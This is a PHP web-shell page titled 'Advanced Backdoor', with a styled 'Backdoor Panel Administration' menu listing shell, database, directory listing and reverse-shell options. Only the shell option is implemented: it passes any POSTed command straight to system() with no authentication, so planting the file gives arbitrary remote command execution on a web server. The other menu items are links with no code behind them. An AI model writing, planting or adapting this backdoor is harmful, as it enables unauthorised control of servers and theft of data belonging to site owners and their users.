<html>
	<head>
		<title>Advanced Backdoor</title>
		<style>
			html,body {
				margin:0;
				padding:0;
			}

			* {
				padding:0;
				margin:0;
			}
			body {
				background:#ecf0f1;
			}

			header {
				background:#2c3e50;
				display:block;
				overflow:hidden;
				padding:1.5em;
			}	
			header h1 {
				color:#ecf0f1;
			}
			
			nav {
				background:#0f1114;
				height:100%;
				float:left;
				width:20%;
				font-family:"Helvetica";
				overflow:hidden;
			}
			nav ul {
				list-style:none;
			}
			nav a {
				color:white;
				text-decoration:none;
				position:relative;
				overflow:hidden;	
				right:-20px;
			}

			nav a:hover {
				right:-60px;
			}
			nav li:hover {
				background:red;
			}
			nav li {
				right:-20px;
				overflow:hidden;
				background:black;
				padding:.5em;
				margin:.5em;
				border-radius:5px;
			}	
			main {
				position:relative;
				background:black;
				float:left;
				overflow:hidden;
				height:100%;
				width:80%;
				color:green;
				font-size:2em;
			}
			main p {
				float:left;
				font-size:2em;
				width:2%;
			}
			main pre {
				display:block;
				float:left;
				clear:both;
			}
			#shell {
				background:none;
				color:green;
				border:none;
				font-size:2em;
				float:left;
				width:calc(100%-10%);
				
			}

			#shell:focus {
				outline:none;
			}
		</style>
	</head>

	<body>
		<header>
			<h1>Backdoor Panel Administration</h1>
		</header>
		<nav>
			<ul>	
				<a href="?q=sh"><li>Shell</li></a>
				<a href="?q=db"><li>Database</li></a>
				<a href="?q=list"><li>Directory Listing</li></a>
				<a href="?q=reverse&ip&port"><li>Lauch Reverse Shell</li></a>
			<ul>
		</nav>
		<main>
			<?php
				if(isset($_GET['q'])){
					$location = $_GET['q'];
					if($location === "sh"){
						echo '<p>&gt;</p><form action="" method="post"><input id="shell" type="text" name="cmd"></form>';	
						if(isset($_POST['cmd'])){
							echo "<pre>";	
							system($_POST['cmd']);
							echo "</pre>";
							die;
						}
					}
				}else {
					echo '<h1>Welcome</h1>';
				}
			?>
		</main>
	</body>
</html>
